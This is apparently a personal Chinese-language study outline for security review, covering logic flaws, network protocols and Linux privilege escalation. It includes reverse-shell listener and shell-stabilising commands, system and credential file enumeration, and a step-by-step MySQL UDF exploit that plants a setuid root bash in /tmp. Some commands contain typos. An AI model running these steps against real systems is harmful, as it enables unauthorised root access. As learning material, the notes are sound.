20天复习路线

## 逻辑漏洞

1. 签约漏洞

自动续费 多个手机登录停留支付界面

2. 会员升级

3. 订单关闭

4. 并发

- 网络
- 两次以及以上并发
- 随机参数如时间戳
- 拦截并发----

5. 支付金额

VLSM

![image-20240811160701086](C:\Users\Annie\AppData\Roaming\Typora\typora-user-images\image-20240811160701086.png)

OSPF

VLAN 

STP（生成树协议）

- 选举根交换机：网桥ID（BID最小者当选），优先级相同比较mac地址小当选

- 选举根端口

  每一个非根交换机选出一个根端口RP（Root Port）只选一个

  RP用于接收根交换机发来的BPDU（Bridge Protocol Data Unit），也用来转发普通流量
  
- 选举指定端口并阻塞备用端口

​       选出指定端口并且

VRRP：网关备份，   避免由于局域网网关单点故障而导致的网络中断（增加网关接口）

- 虚拟ip地址（代表一组N个网关）
- Master和Backup（主从）一般都是主优先，ip地址大的成为Master

```
sys
vrrp vrid ?
vrrp vrid 10 priority ?
vrrp vrid 10 virtual-ip 10.0.0.254 
display vrrp verbose
```

NAT：顾名思义网桥转换，使私网能访问公网

ACL访问控制列表

```
创建规则
rule deny resource 192.168.10.1 0.0.0.0

deny:禁止
permit:允许
0.0.0.0:只针对192.168.10.1


调用规则，应用于接口
traffic-filter inbound acl 2000   调用acl 2000

inbound:对接口进行过滤
outbound:
```

## 入侵检测

### IDS和IPS



## 提权（Privilege Escalation）

### 系统溢出提权

常用提权权限体系

ugo（数据库和应用迁移 UGO）

suid

```
https://blog.csdn.net/weixin_39762423/article/details/140111218
```

sgid

capabilities

apparmor与selinux

```
https://www.cnblogs.com/zhangrui153169/p/15349167.html
```

ACL



#### 安全机制

Grsecurity

Pax

ExecSheild

ASLR

TOMOYO Linux

SMACK

Yama

CGroup

Linux Namespaces

StackGuard

Proplice

seccomp

ptrace

capsicum 

Mprotect

chroot

firejail



#### 提权原理

1. 低权限修改，高权限执行
2. 用户行为：低权限运维人员也会输入/储存高权限凭据

3. 超越权限体系，在其上层（如内存）捕获/修改凭据等信息

#### 提权枚举

```
提高交互性（shell->pty）
python -c 'import pty;pty.span("/bin/bash")'    导入pty提高工段稳定性
stty raw -echo   设置终端设置raw传输关闭echo
export TERM=xterm-color  

rlwrap nc -lvnp 443     历史记录


手工枚举
whoami
id root
who
uname -a 查看内核版本 
lsb_release -a
cat /proc/version
cat /etc/iss ue
hostnamectl

查看网卡和ip
ip addr        //或者ipconfig
ip route
ip neigh
arp -a      mac和ip绑定情况

hostname  

sudo -l 当前用户可以用root身份执行
capabilities
getcap -r / >2/dev/null  得到权限能力的一些属性
ls -a
history
cat /etc/passwd
cat /etc/crontab
echo ￥PATH
ps -ef   查看进程
ps axjf    （x表示没链接终端） 
ps aux     u显示启动进程的用户
top  查看进程
netstat -a  网络统计    -at（tcp）   -au（udp）
netstat -s
netstat -ano
find / -perm -u=s -type f 2>/dev/null
which
locate
cat /etc/fstab   查看挂载的磁盘



wget（不联网下载）
自动化枚举
Linpeas
Linenum
Linux smart enumeration
Linux-exploit-suggester
Linuxprichecker（python格式）
unix-privesc-check   （pentestmonkey ）

curl

sudo 
```

### 数据库提权

Mysql-udf  （user defined fion）

提权条件

```
secure_file_priv      为''
Load data
select into outfile
load_file()
```

```
示例：

searchsploit mysql udf   列出已有的文件
searchsploit mysql udf -m 1518
cd /home/user/tools/mysql-udf/
ls
gcc -g -c raptor_udf2.c -fPIC  (-fPIC:位置无关代码，多个程序都可执行)
mysql -u root -p
show variables like '%secure_file_priv%'
show variables like '%plugin%'
use mysql
create table foo(line blob) (blob:binary large object ,存储图像，音频，udf等)

insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'))

select * from foo into dumpfile '/user/lib/mysql/plugin/raptor_udf2.so'

create function do_system returns integer soname 'raptor_udf2.so'

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash')

exit

/tmp/rootbash -p

```

### 脏牛提权

类似mysql脏读

原子性与伪原子性   

  double checked locking if condition （双重检验检查if条件锁   ）

*修复new函数的多线程安全 

## Javascript Jquery

Jquery放在自己的js之前

```
$(doucuneb)
```

